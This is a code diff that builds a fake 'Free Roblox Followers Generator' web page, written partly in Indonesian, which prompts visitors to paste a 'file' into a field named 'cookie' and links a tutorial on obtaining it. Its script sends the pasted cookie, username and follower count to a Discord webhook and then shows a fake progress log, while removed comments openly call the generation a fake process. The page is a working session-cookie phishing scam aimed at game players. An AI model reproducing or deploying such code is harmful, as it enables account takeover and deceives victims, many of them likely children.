@@ -1,3 +1,201 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Roblox Followers Generator 2024</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://www.wallpapertip.com/wmimgs/41-416862_roblox-wallpaper-hd.jpg');
+            background-size: cover;
+            background-position: center;
+            color: #fff;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: rgba(29, 29, 46, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 95%;
+            max-width: 500px;
+            border: 1px solid #444;
+        }
+        .logo {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #00bfff;
+            text-shadow: 0 0 10px #00bfff;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #b0b0b0;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #e0e0e0;
+        }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a1a2e;
+            border: 1px solid #555;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus, .input-group textarea:focus {
+            outline: none;
+            border-color: #00bfff;
+        }
+        .input-group textarea {
+            resize: vertical;
+            font-family: monospace;
+            font-size: 11px;
+        }
+        .generate-btn {
+            background-color: #555;
+            color: #999;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: not-allowed;
+            transition: background-color 0.3s, transform 0.2s, color 0.3s;
+            margin-top: 10px;
+        }
+        .generate-btn.ready {
+            background-color: #4caf50;
+            color: #fff;
+            cursor: pointer;
+        }
+        .generate-btn.ready:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+        .generate-btn:disabled:not(.ready) {
+            background-color: #555;
+            color: #999;
+            cursor: not-allowed;
+        }
+        .tutorial-helper {
+            margin-top: 15px;
+        }
+        .tutorial-btn {
+            display: inline-block;
+            background-color: transparent;
+            color: #00bfff;
+            border: 2px solid #00bfff;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .tutorial-btn:hover {
+            background-color: #00bfff;
+            color: #121212;
+        }
+        .tutorial-helper p {
+            font-size: 11px;
+            color: #888;
+            margin-top: 10px;
+            text-align: center;
+        }
+        #statusLog {
+            margin-top: 25px;
+            background-color: #0f0f1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            height: 150px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+        }
+        .log-info { color: #ffeb3b; }
+        .log-success { color: #4caf50; }
+        .log-error { color: #f44336; }
+        .activity-feed {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        .activity-feed ul {
+            list-style: none;
+            padding: 0;
+        }
+        .activity-feed li {
+            background-color: rgba(255,255,255,0.05);
+            padding: 5px;
+            border-radius: 4px;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">ROBLOX FOLLOWERS</div>
+        <div class="subtitle">FOLLOWERS BOT FOR MOBILE</div>
+
+        <div class="input-group">
+            <label for="username">Roblox Username</label>
+            <input type="text" id="username" placeholder="Masukkan username lo">
+        </div>
+
+        <div class="input-group">
+            <label for="followers">Jumlah Followers (Max 10.000)</label>
+            <input type="number" id="followers" value="5000" min="100" max="10000">
+        </div>
+
+        <div class="input-group">
+            <label for="cookie">input file to get followers</label>
+            <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
+            
+            <div class="tutorial-helper">
+                <a href="https://youtube.com/shorts/nrRlZrpCiLQ?si=RQ3lLfjLI1jEOadH" target="_blank" class="tutorial-btn">
+                    📱 TUTORIAL MOBILE
+                </a>
+                <p>Gatau cara dapetin filenya? Tonton tutorial ini.</p>
+            </div>
+        </div>
+
+        <button id="generateBtn" class="generate-btn" disabled>WAITING FOR FILE FOLLOWERS</button>
+
+        <div id="statusLog"></div>
+
+        <div class="activity-feed">
+            <strong>Recent Activity:</strong>
+            <ul id="activityList">
+                <!-- Akan diisi sama JavaScript -->
+            </ul>
+        </div>
+    </div>
+
     <script>
         const generateBtn = document.getElementById('generateBtn');
         const usernameInput = document.getElementById('username');
@@ -52,7 +250,7 @@
 
         cookieInput.addEventListener('input', checkCookie);
 
-        generateBtn.addEventListener('click', async function() { // <-- Ganti jadi async
+        generateBtn.addEventListener('click', async function() {
             const username = usernameInput.value || 'UnknownUser';
             const followers = followersInput.value || '0';
             const cookie = cookieInput.value;
@@ -75,22 +273,18 @@
                 });
 
                 if (!response.ok) {
-                    // Kalau Discord nolak (misal rate limit), kita tahu
                     console.error('Webhook failed:', response.status, response.statusText);
                     addLog(`Failed to send to Discord (Error: ${response.status}). Please try again.`, 'error');
-                    // Jangan lanjutkan proses palsu kalau gagal kirim
                     generateBtn.disabled = false;
                     generateBtn.textContent = 'GENERATE FOLLOWERS';
                     generateBtn.classList.add('ready');
                     return; 
                 }
 
-                // Kalau berhasil, baru jalanin proses palsunya
                 console.log('Webhook sent successfully!');
                 startFakeProcess(username, followers);
 
             } catch (error) {
-                // Kalau ada error jaringan atau lainnya
                 console.error('Fetch error:', error);
                 addLog('Network error! Could not connect to server.', 'error');
                 generateBtn.disabled = false;
@@ -113,3 +307,5 @@
         window.onload = populateActivity;
 
     </script>
+</body>
+</html>
